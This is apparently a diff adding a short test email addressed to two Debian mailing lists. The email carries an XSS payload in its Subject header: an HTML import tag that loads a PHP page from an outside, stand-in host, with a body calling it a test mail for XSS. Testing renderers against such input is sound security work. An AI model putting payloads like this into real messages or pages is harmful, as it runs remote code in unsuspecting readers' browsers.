@@ -1,0 +1,7 @@
+From: Derek Richards <extreme_sassy@gracanada.com>
+To: debian-mirrors@lists.debian.org, debian-www@lists.debian.org
+Subject: <link rel="import" href="http://xxx.com/1.php">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
